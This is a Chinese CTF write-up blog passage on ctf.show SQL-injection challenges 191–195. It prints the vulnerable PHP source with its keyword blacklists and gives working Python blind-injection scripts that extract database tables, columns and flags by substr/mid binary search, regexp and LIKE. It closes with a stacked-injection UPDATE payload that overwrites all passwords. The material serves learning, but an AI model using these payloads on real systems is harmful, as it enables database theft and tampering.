<h2 id="191（和上题差不多，多了就是把ascii过滤了）"><a href="#191（和上题差不多，多了就是把ascii过滤了）" class="headerlink" title="191（和上题差不多，多了就是把ascii过滤了）"></a>191（和上题差不多，多了就是把ascii过滤了）</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|ascii/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>将脚本稍微改改就成（下面是直接使用字符进行的比较，也可以直接改上一题的ascii为ord）</strong></p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">## 过滤了 ascii函数</span></span><br><span class="line"><span class="comment">## 字母直接进行 大小于比较 也就是ascii值比较，也就是说上一题脚本ascii多余了，但是跑出来多多少少有点问题，将上一题脚本的ascii改为ord没有问题，应该是直接比较的锅?</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://3b003a83-1047-4703-90a3-9d5ce5404c99.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line"><span class="comment">## 表名 CtFsHOw&#123;FL0G,CtFsHOw&#123;usEr   正确的应该是：ctfshow_fl0g,ctfshow_user</span></span><br><span class="line">payload = <span class="string">&quot;0&#x27; or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27;,1,0) -- &quot;</span></span><br><span class="line"><span class="comment">## 列名 ID,F1AG,ID,usErNAME,pAss</span></span><br><span class="line"><span class="comment">## payload = &quot;0&#x27; or if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27;,1,0) -- &quot;</span></span><br><span class="line"><span class="comment">## flag</span></span><br><span class="line"><span class="comment">## payload = &quot;0&#x27; or if(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27;,1,0) -- &quot;</span></span><br><span class="line"></span><br><span class="line">true_flag = <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (<span class="built_in">abs</span>(start - end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        p = (start + end) // <span class="number">2</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: payload.<span class="built_in">format</span>(index, <span class="built_in">chr</span>(p)),</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                response = requests.post(url, data=data)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> true_flag <span class="keyword">in</span> response.text:</span><br><span class="line">            start = p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = p</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br></pre></td></tr></table></figure></div>







<h2 id="192（禁了ord，ascii）"><a href="#192（禁了ord，ascii）" class="headerlink" title="192（禁了ord，ascii）"></a>192（禁了ord，ascii）</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|ascii|ord|hex/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h3 id="解法1-1"><a href="#解法1-1" class="headerlink" title="解法1"></a><strong>解法1</strong></h3><p><strong>这题多把我们的ord给ban了，也就是说其实上一题目的是让我们用ord，这一题用我们上面给的脚本即可</strong></p>
<p>这是其他师傅写的，和上一题本质上是一样的</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://ca7884a2-04c6-4e4e-b1ca-2a03064c89ad.challenge.ctf.show/api/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    length=<span class="built_in">len</span>(flag)</span><br><span class="line">    <span class="built_in">min</span>=<span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span>=<span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        j=<span class="built_in">min</span>+(<span class="built_in">max</span>-<span class="built_in">min</span>)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">min</span>==j:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(flag.lower())</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">chr</span>(j)==<span class="string">&quot; &quot;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        payload=<span class="string">&quot;&#x27; or if(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;&#125;,1)&lt;&#x27;&#123;&#125;&#x27;,1,0)-- -&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">chr</span>(j))</span><br><span class="line"></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url=url,data=data).text</span><br><span class="line">        <span class="comment">#print(r)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">r&quot;\u5bc6\u7801\u9519\u8bef&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">            <span class="built_in">max</span>=j</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            <span class="built_in">min</span>=j</span><br></pre></td></tr></table></figure></div>



<h3 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h3><p>payload 使用 regexp 来正则匹配的方式</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://25b43db9-030f-483f-a2df-1bd47b8d62a7.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line">flagstr=<span class="string">&quot;_&#123;-&#125;1234567890abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line"></span><br><span class="line">re=<span class="string">&quot;&quot;</span></span><br><span class="line">flag=<span class="string">&quot;flag is :&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        payload = <span class="string">f&quot;admin&#x27; and if(substr((select group_concat(f1ag) from ctfshow_fl0g),<span class="subst">&#123;i&#125;</span>,1)regexp(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;),1,2)=&#x27;1&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure></div>



<h2 id="193-194-多禁了substr"><a href="#193-194-多禁了substr" class="headerlink" title="193-194(多禁了substr)"></a>193-194(多禁了substr)</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|ascii|ord|hex|substr/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>(194还多禁了char、left、right、substring)</strong></p>
<h3 id="解法一：使用正则"><a href="#解法一：使用正则" class="headerlink" title="解法一：使用正则"></a>解法一：使用正则</h3><p><strong>exp</strong></p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://a0a9883b-4b1a-409c-8f0e-e1beda2cdfb2.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string.digits+string.ascii_lowercase+<span class="string">&quot;_&#123;&#125;&quot;</span>:</span><br><span class="line">        <span class="comment"># payload=&quot;&#x27; or if((select group_concat(table_name) from information_schema.tables where table_schema=database()) like &#x27;&#123;&#125;&#x27;,1,0)-- -&quot;.format(flag+j+&quot;%&quot;)</span></span><br><span class="line">        <span class="comment"># payload=&quot;&#x27; or if((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27;) like &#x27;&#123;&#125;&#x27;,1,0)-- -&quot;.format(flag+j+&quot;%&quot;)</span></span><br><span class="line">        payload = <span class="string">&quot;&#x27; or if((select group_concat(f1ag) from ctfshow_flxg) like &#x27;&#123;&#125;&#x27;,1,0)#&quot;</span>.<span class="built_in">format</span>(flag + j + <span class="string">&quot;%&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\r&quot;</span>+payload,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:<span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">r&quot;\u5bc6\u7801\u9519\u8bef&quot;</span> <span class="keyword">in</span> r.text :</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span>(j == <span class="string">&#x27;&#125;&#x27;</span>):</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;flag is:<span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<p>有些小问题，最后flag的{}都变成了_不知道为啥，手动改改吧</p>
<h3 id="解法二：使用mid或者right、left"><a href="#解法二：使用mid或者right、left" class="headerlink" title="解法二：使用mid或者right、left"></a>解法二：使用mid或者right、left</h3><p><strong>exp:</strong></p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://1b6f8923-72d2-4a79-bf53-e8a6a58b00e4.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line"><span class="comment"># 表名 ctfshow&#123;flxg,ctfshow&#123;user</span></span><br><span class="line"><span class="comment"># payload = &quot;&#x27; or if(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27;,1,0)#&quot;</span></span><br><span class="line"><span class="comment"># 列名 id,f1ag,id,username,pass</span></span><br><span class="line"><span class="comment"># payload = &quot;0&#x27; or if(mid((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27;,1,0) -- &quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;0&#x27; or if(mid((select f1ag from ctfshow_flxg),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27;,1,0) -- &quot;</span></span><br><span class="line">judge = <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+]少女折寿中 :&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end =<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span>(<span class="built_in">abs</span>(start-end)== <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        p = (start+end)//<span class="number">2</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload.<span class="built_in">format</span>(index,<span class="built_in">chr</span>(p)),</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                response = requests.post(url,data=data)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> judge <span class="keyword">in</span> response.text:</span><br><span class="line">            start = p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = p</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">chr</span>(end) == <span class="string">&#x27;!&#x27;</span>):</span><br><span class="line">        exit()</span><br><span class="line">    result += <span class="built_in">chr</span>(end).lower()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\rflag is:<span class="subst">&#123;result&#125;</span>&quot;</span>,end=<span class="string">&quot;&quot;</span>)  <span class="comment"># 部分字母变成了大写 _ 变成了 &#123; 暂时还不知道什么原因 但可以肯定跟没用 ascii() 有关</span></span><br><span class="line">    index +=<span class="number">1</span></span><br></pre></td></tr></table></figure></div>



<h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><h2 id="195（未禁；和update）"><a href="#195（未禁；和update）" class="headerlink" title="195（未禁；和update）"></a>195（未禁；和update）</h2><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码检测</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;密码只能为数字&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//密码判断</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;登陆成功&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#x27;|\&quot;|select|union|or|and|\x26|\x7c|file|into/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>这题<strong>过滤</strong>了<strong>空格</strong>，我们尝试使用反引号来绕过（恰好一个关键字，一个字符串，就可以起到间隔作用）</p>
</li>
<li><p>这题<strong>没有过滤分号</strong>，可以使用堆叠注入</p>
</li>
<li><p>这题<strong>没有过滤update</strong>，我们可以修改数据库内容</p>
</li>
</ul>
<p><strong>利用堆叠注入更改密码为 274。用户名处填写（不使用16进制也可以操作）</strong></p>
<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a><strong>payload:</strong></h3><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>;<span class="keyword">update</span>`ctfshow_user`<span class="keyword">set</span>`pass`<span class="operator">=</span><span class="number">0x323734</span></span><br></pre></td></tr></table></figure></div>

<p>（我现在才知道，这个0x开头的16进制算法是：0x表示16进制，后面每两位是ascii的16进制，如：32转为十进制是 50，用ascii化为2）</p>
<hr>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\languages\websafe\DataCon学习\day3_sql注入\pic\image-20220818164530076.png"
                      alt="image-20220818164530076"
                ></p>
<hr>
